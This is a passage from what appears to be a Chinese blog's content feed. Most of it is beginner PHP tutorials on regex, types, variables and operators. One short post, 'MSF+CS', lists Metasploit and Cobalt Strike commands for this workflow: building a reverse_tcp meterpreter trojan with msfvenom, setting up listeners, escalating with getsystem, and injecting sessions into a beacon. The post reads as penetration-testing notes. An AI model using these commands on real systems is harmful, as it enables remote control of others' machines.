class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">贪婪模式: 尽量是往多的取</span></span><br><span class="line"><span class="comment">懒惰模式: 往少了匹配</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&lt;b&gt;a?aa&lt;/b&gt; &lt;b&gt;ccb&gt;c&lt;/b&gt; &lt;b&gt;ddd&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ptn</span> = <span class="string">&#x27;/&lt;b&gt;.*&lt;\/b&gt;/&#x27;</span>;  <span class="comment">//贪婪模式</span></span><br><span class="line"><span class="variable">$ptn</span> = <span class="string">&#x27;/&lt;b&gt;.*?&lt;\/b&gt;/&#x27;</span>; <span class="comment">//懒惰模式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;axaaxaaaxaaaax&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ptn</span> = <span class="string">&#x27;/a&#123;1,4&#125;?/&#x27;</span>;   <span class="comment">//懒惰模式    表示尽量匹配1次</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="小结尾"><a href="#小结尾" class="headerlink" title="小结尾"></a>小结尾</h1><p>一门编程语言的内容实在是太多了，所以分成了四个部分，详情如下：</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP">第一部分</a>：基本语法、数据类型、PHP运算符、流程控制</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP2/">第二部分</a>：函数、数组、正则</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP3/">第三部分</a>：错误控制、时间戳、文件处理、文件上传、会话控制</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP类和对象/">第四部分</a>：PHP的类和对象</p>]]></content>
      
      
      <categories>
          
          <category> 编程代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF+CS</title>
      <link href="/2022/09/10/MSF%E5%92%8CCS%E8%81%94%E5%8A%A8/"/>
      <url>/2022/09/10/MSF%E5%92%8CCS%E8%81%94%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="CS派生给MSF"><a href="#CS派生给MSF" class="headerlink" title="CS派生给MSF"></a>CS派生给MSF</h1><p>use exploit&#x2F;multi&#x2F;handler  ；设置监听</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp  ;设置攻击的payload;</p><p>set lhost xxx.xxx.xxx.xxx  设置服务器地址</p><p>set lport xxx设置服务器监听端口</p><p>run或者exploit 执行</p><p>进入控制台</p><h1 id="MSF派生给CS"><a href="#MSF派生给CS" class="headerlink" title="MSF派生给CS"></a>MSF派生给CS</h1><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;本机IP&gt; LPORT&#x3D;&lt;本机端口&gt; -f exe &gt; shell.exe；Linux生成木马</p><p>use exploit&#x2F;multi&#x2F;handler  ；设置监听</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp  ;设置攻击的payload;</p><p>set lhost xxx.xxx.xxx.xxx  设置服务器地址</p><p>set lport xxx设置服务器监听端口</p><p>run或者exploit 执行</p><p>进入控制台</p><p>ps-migrate &lt;目的进程位置&gt;-getuid-getsystem-shell-chcp 65001-exit<br>background(挂起会话)-   可选择&lt;session -i 1(进入会话)&gt;</p><p>CS端配置监听，payload配置Beacon HTTP,地址、端口；</p><p>转回MSF</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject设置注入</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_http设置payload</p><p>set session &lt;&gt;设置会话</p><p>set lhost xxx.xxx.xxx.xxx设置地址</p><p>set lport xxx设置端口</p><p>run执行，派生成功；</p>]]></content>
      
      
      <categories>
          
          <category> 前提知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP——第一部分</title>
      <link href="/2022/09/10/PHP/"/>
      <url>/2022/09/10/PHP/</url>
      
        <content type="html"><![CDATA[<h1 id="基本语法-数据类型"><a href="#基本语法-数据类型" class="headerlink" title="基本语法+数据类型"></a>基本语法+数据类型</h1><h2 id="LAMP"><a href="#LAMP" class="headerlink" title="LAMP"></a>LAMP</h2><p>Linux        操作系统 </p><p>Apache    web服务器</p><p>MySQL     数据库服务器</p><p>PHP          超文本预处理器.  服务器端脚本编程语言</p><h2 id="PHP代码书写"><a href="#PHP代码书写" class="headerlink" title="PHP代码书写"></a>PHP代码书写</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php<span class="comment">//开头</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;php编程&#x27;</span>;<span class="comment">//以英文分号结束</span></span><br></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//单行注释</span></span><br><span class="line"><span class="comment">#单行注释</span></span><br><span class="line"><span class="comment">/*   */</span>  多行注释</span><br></pre></td></tr></table></figure><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;abc&#x27;</span>;<span class="comment">//将abc打印到页面上</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;abc&lt;/h1&gt;&#x27;</span>;<span class="comment">//打印html语言，但是html是由浏览器解析的，在php里也只是字符串</span></span><br></pre></td></tr></table></figure><h3 id="嵌入"><a href="#嵌入" class="headerlink" title="嵌入"></a>嵌入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=<span class="string">&#x27;color:red&#x27;</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;abc&#x27;</span>; <span class="meta">?&gt;</span>&lt;/php&gt;<span class="comment">//后缀名应为.php</span></span><br></pre></td></tr></table></figure><h3 id="单引号和双引号区别"><a href="#单引号和双引号区别" class="headerlink" title="单引号和双引号区别"></a>单引号和双引号区别</h3><ol><li>单引号不解析变量</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">     <span class="variable">$name</span> = <span class="string">&#x27;张三&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;我的名字叫 $name&#x27;</span>;   <span class="comment">// 单引号不解析变量, 所以输出  我的名字叫 $name</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>双引号解析变量时, 应该加大括号 {变量名}</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">     <span class="variable">$name</span> = <span class="string">&#x27;张三&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;我的名字叫 <span class="subst">$name</span>&quot;</span>;   <span class="comment">// 双引号 解析变量, 所以输出  我的名字叫 张三</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$name&#125;</span>这个人很帅!&quot;</span>; <span class="comment">// 解析变量时,应该 &#123;变量名&#125; </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li><p>如果没有变量需要解析, 尽量使用单引号, 因为单引号的执行效率高</p></li><li><p>单引号只解析 <strong>‘</strong>  和  *<em>*</em>  , 双引号还可以解析\r\n\t转义字符.</p></li></ol><p><strong>is_string( 变量名 )</strong>可以判断变量是否为一个字符串类型.</p><h3 id="字符串的连接操作"><a href="#字符串的连接操作" class="headerlink" title="字符串的连接操作"></a>字符串的连接操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str_a</span> = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    <span class="variable">$str_b</span> = <span class="string">&#x27;def&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str_a</span>.<span class="variable">$str_b</span>;   <span class="comment">// abcdef  . 字符串连接符  </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="文件输出编码"><a href="#文件输出编码" class="headerlink" title="文件输出编码"></a>文件输出编码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="comment">/* 在纯php文件中, 设置字符编码 */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>1.变量是存放数据的容器.</p><p>2.它里面的数据可以多次读取使用.</p><p>3.把新的数据放进去, 旧的数据会被覆盖. 也就是说它存的内容是可以变化的.</p><h3 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h3><p>1.以$开头</p><p>2.数字、字母、下划线的组合，但不能以数字开头</p><p>3.严格区分大小写</p><p>4.可以使用中文，但不建议</p><h3 id="命名方法"><a href="#命名方法" class="headerlink" title="命名方法"></a>命名方法</h3><p>1.驼峰命名法：</p><p>​              单驼峰：第一个单词首字母小写，以后每个单词的首字母都大写。</p><p>​              双驼峰：每个单词的首字母都大写。</p><p>2.使用下划线。每个单词之间使用下划线来进行分隔。</p><h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span> = <span class="number">123</span>;<span class="comment">//把右边的数据赋值给变量$a</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;hello world&#x27;</span>;<span class="comment">//把一串字符存放到变量$b中</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>变量中存放的数据类型, 就是变量的类型. php中变量有8种类型:</p><p>4种标量 (标准的变量类型)</p><ul><li>布尔型 (boolean)</li><li>整数型 (integer)</li><li>浮点型 (float)</li><li>字符串型 (string)</li></ul><p>2种复合类型 ( 复合：里面可以放多个值)</p><ul><li>数组 ( array )</li><li>对象 ( object )</li></ul><p>2种特殊类型 </p><ul><li>资源 ( resource )</li><li>NULL</li></ul><p>打印变量的类型和值可以用  var_dump( 变量名 );</p><h3 id="布尔类型-boolean"><a href="#布尔类型-boolean" class="headerlink" title="布尔类型 ( boolean )"></a>布尔类型 ( boolean )</h3><p> 表明两个状态. 用来做开关. 用来做判断条件.</p><p> <strong>true</strong>  真     你们比哥年轻</p><p> <strong>false</strong> 假     哥喜欢男人.</p><p>is_bool( 变量名 ) 可以判断变量是否为布尔类型  是,返回true  不是,返回false </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="literal">true</span>;    <span class="comment">// 页面显示  1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="literal">false</span>;   <span class="comment">// 什么也不显示</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​     </p><h3 id="整数类型-integer"><a href="#整数类型-integer" class="headerlink" title="整数类型 ( integer )"></a>整数类型 ( integer )</h3><p>十进制 :  0 ~ 9     默认</p><p>二进制 :  0 ~ 1     以0b开头</p><p>十六进制 : 0 ~ f   以0x开头</p><p>八进制 : 0 ~ 7      以0开头</p><p>当用 echo 输出时, 它只会以十进制数显示.</p><p>is_int( 变量名 )可以判断变量是否为整数类型</p><p>​     </p><h3 id="浮点类型-float"><a href="#浮点类型-float" class="headerlink" title="浮点类型  ( float )"></a>浮点类型  ( float )</h3><p>浮点数, 即小数. 受存储精度影响, 两个小数的运算结果很多时候也是不准确的.如  0.1 + 0.2 就不等于 0.3</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="number">0.1</span> + <span class="number">0.2</span> == <span class="number">0.3</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;你可想好了再说呦!!!&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&#x27;%f&#x27;</span>,<span class="number">0.1</span>);  <span class="comment">//0.100000</span></span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&#x27;%f&#x27;</span>,<span class="number">0.2</span>);  <span class="comment">//0.200000</span></span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&#x27;%f&#x27;</span>,<span class="number">0.3</span>);  <span class="comment">//0.300000</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&#x27;%0.32f&lt;br&gt;&#x27;</span>, <span class="number">0.1</span>);</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&#x27;%0.32f&lt;br&gt;&#x27;</span>, <span class="number">0.2</span>);</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&#x27;%0.32f&lt;br&gt;&#x27;</span>, <span class="number">0.3</span>);</span><br></pre></td></tr></table></figure><p>is_float( 变量名 )可以判断变量是否为 浮点型</p><p>is_numeric( 变量名 )可以判断变量是否为 数值类型</p><h3 id="NULL类型"><a href="#NULL类型" class="headerlink" title="NULL类型"></a>NULL类型</h3><p>表示一个变量没有值。NULL类型唯一可能的值就是NULL</p><p><strong>被认为是NULL的情况:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>( <span class="variable">$a</span> );    <span class="comment">// 1.变量没有声明     返回 NULL</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$b</span>;                </span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>( <span class="variable">$b</span> );    <span class="comment">// 2.变量没有被赋值   返回 NULL</span></span><br><span class="line">  </span><br><span class="line">    <span class="variable">$c</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">unset</span>( <span class="variable">$c</span> );</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>( <span class="variable">$c</span> );    <span class="comment">// 3.变量被销毁     返回 NULL</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$d</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>( <span class="variable">$d</span> );    <span class="comment">// 4.变量被赋值为null  返回 NULL</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>is_null()，用来判断变量是否为空，如果是返回true，否则返回false。</p><h3 id="unset-变量名"><a href="#unset-变量名" class="headerlink" title="unset( 变量名 )"></a>unset( 变量名 )</h3><p>销毁指定的变量</p><p>1.变量的实质是内存空间的一块存储区域.</p><p>2.PHP代码结束时,所有变量常量都会自动销毁</p><p>3.变量不再使用时, 手动提前销毁, 可以及时释放宝贵的内存空间</p><h3 id="isset-变量名"><a href="#isset-变量名" class="headerlink" title="isset( 变量名 )"></a>isset( 变量名 )</h3><p>检测变量是否已设置并且非 <strong><code>NULL</code></strong></p><p>​    1) 变量未声明  或者 未赋值   </p><p>​    2) 变量的值为 null  </p><p>上面两种情况返回 false  , 其他情况返回 true  </p><p>​    </p><h3 id="empty-变量名"><a href="#empty-变量名" class="headerlink" title="empty( 变量名 )"></a>empty( 变量名 )</h3><p>检查一个变量是否为空</p><p>为空返回 true    不为空返回 false</p><p>为空的情况有以下几种 :</p><ul><li>“”(空字符串)</li><li>0        (整数 0)</li><li>0.0     (浮点数 0)</li><li>“0”    (字符串 0)</li><li>NULL</li><li>FALSE    (布尔型)</li><li>array()    (空数组)</li><li>$var;      (声明未赋值的变量)</li></ul><h3 id="可变变量-不重要"><a href="#可变变量-不重要" class="headerlink" title="可变变量(不重要)"></a>可变变量(不重要)</h3><p><strong>变量名前再加$.  变量名还是一个变量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="string">&#x27;xxoo&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$$a</span>;    <span class="comment">// 从后往前看 ， $a = b , 结果输出为$b.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="引用变量"><a href="#引用变量" class="headerlink" title="引用变量"></a>引用变量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">100</span>;</span><br><span class="line">    <span class="variable">$b</span> = &amp;<span class="variable">$a</span>;   <span class="comment">// $b 和 $a 将代表同一个容器, 所以改变$b的值, $a也就改变了</span></span><br><span class="line">                <span class="comment">// &amp; 称为取地址符</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$a</span>);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;    <span class="comment">// 销毁互为引用关系变量中的一个变量, 另一个仍然有效</span></span><br><span class="line">                <span class="comment">// 销毁 $a 只是不让$a代表容器了,  容器本身还在, 还由$b代表   </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>php属于弱语言类型，变量的类型取决于它从存放的数据，数据类型变了，变量类型也随之改变。</p><h3 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h3><h4 id="判断类型转换-布尔"><a href="#判断类型转换-布尔" class="headerlink" title="判断类型转换(布尔)"></a>判断类型转换(布尔)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">if</span>(变量或表达式)&#123;</span><br><span class="line">        <span class="comment">//括号里的内容，会被自动转换成布尔型的true 或者false</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>False的情况：</p><p>1.布尔值false</p><p>2.整数0</p><p>3.浮点数0.0</p><p>4.字符串””和”0”</p><p>5.变量没有赋值或未定义</p><p>6.空数组array[]</p><p>7.NULL</p><h4 id="运算自动转换"><a href="#运算自动转换" class="headerlink" title="运算自动转换"></a>运算自动转换</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="string">&#x27;20&#x27;</span> + <span class="string">&#x27;30&#x27;</span>;<span class="comment">// 20+30=50</span></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;123&#x27;</span> + <span class="string">&#x27;2ab&#x27;</span>;  <span class="comment">// 123 + 2 = 125</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="string">&#x27;2y&#x27;</span> + <span class="string">&#x27;3c&#x27;</span>;    <span class="comment">// 2 + 3  = 5</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="string">&#x27;&#x27;</span> + <span class="number">5</span>;         <span class="comment">// 0 + 5 = 5</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="literal">true</span> + <span class="literal">false</span>;   <span class="comment">// 1 + 0 = 1</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="literal">true</span> + <span class="number">1</span>;       <span class="comment">// 1 + 1 = 2</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="literal">false</span> + <span class="number">5</span>;      <span class="comment">// 0 + 5 = 5</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="string">&#x27;3.14&#x27;</span> + <span class="number">2</span>;     <span class="comment">// 3.14 + 2 = 5.14</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="string">&#x27;12e2ab&#x27;</span> + <span class="number">77</span>;  <span class="comment">// 1200 + 77 = 1277  (注意)</span></span><br></pre></td></tr></table></figure><h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><p><strong>gettype：</strong>获取变量的类型</p><h4 id="1-settype-变量名，类型字符串-设置变量新的类型"><a href="#1-settype-变量名，类型字符串-设置变量新的类型" class="headerlink" title="1.settype(变量名，类型字符串)设置变量新的类型"></a>1.settype(变量名，类型字符串)设置变量新的类型</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$num</span> = <span class="number">12.8</span>;</span><br><span class="line"><span class="variable">$flg</span> = <span class="title function_ invoke__">settype</span>(<span class="variable">$num</span>,<span class="string">&quot;int&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$num</span>);<span class="comment">//输出int(12)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$flg</span>);<span class="comment">//输出bool(true)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">3.14</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">3</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$i</span> = (<span class="keyword">int</span>)<span class="variable">$a</span>;<span class="comment">//转换成整型</span></span><br><span class="line"><span class="variable">$j</span> = (<span class="keyword">float</span>)<span class="variable">$b</span>;<span class="comment">//转换成浮点型</span></span><br><span class="line"><span class="variable">$k</span> = (<span class="keyword">string</span>)<span class="variable">$a</span>;<span class="comment">//转换成字符串类型</span></span><br><span class="line"><span class="variable">$l</span> = (<span class="keyword">bool</span>)<span class="variable">$a</span>;<span class="comment">//转换成布尔类型</span></span><br><span class="line"><span class="variable">$m</span> = (<span class="keyword">array</span>)<span class="variable">$c</span>;<span class="comment">//转换成数组</span></span><br><span class="line"><span class="variable">$n</span> = (<span class="keyword">object</span>)<span class="variable">$c</span>;<span class="comment">//转换成对象</span></span><br></pre></td></tr></table></figure><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>定义赋值后, 存放的数据不能被修改、覆盖，也不能被销毁格式:define( ‘常量名’, 值);</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//常量可以参加运算</span></span><br><span class="line"><span class="comment">//常量名区分大小写, 习惯上用大写</span></span><br><span class="line">    <span class="comment">//常量名也可以使用下划线   USER_NAME</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;NUM&#x27;</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> NUM + <span class="number">10</span>;   <span class="comment">// 20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注意:</span></span><br><span class="line"><span class="keyword">echo</span>  xxoo;    <span class="comment">// 没有单引号,也没有双引号, 系统会尝试把它理解为一个常量</span></span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$arr</span>[abc]  <span class="comment">// 方括号中没有引号, 系统也会尝试理解为常量</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>defined(‘常量名’) 判断一个常量是否存在.</p><p><strong>系统常量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PHP_VERSIONPHP的版本号</span><br><span class="line"></span><br><span class="line">PHP_OSPHP环境的运行操作系统</span><br><span class="line"></span><br><span class="line"><span class="keyword">__LINE__</span>获得当前PHP文件中所在的行号</span><br><span class="line"></span><br><span class="line"><span class="keyword">__FILE__</span>     获取当前PHP文件的相对完整路径</span><br><span class="line"></span><br><span class="line"><span class="keyword">__DIR__</span>获取文件所在的目录</span><br><span class="line"></span><br><span class="line"><span class="keyword">__FUNCTION__</span>当前函数名，只对函数内调用起作用</span><br><span class="line"></span><br><span class="line"><span class="keyword">__CLASS__</span>当前类名，只对类起作用</span><br></pre></td></tr></table></figure><h1 id="PHP运算符"><a href="#PHP运算符" class="headerlink" title="PHP运算符"></a>PHP运算符</h1><h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">6</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> + <span class="variable">$b</span>;   <span class="comment">// 加  10</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span> - <span class="variable">$b</span>;   <span 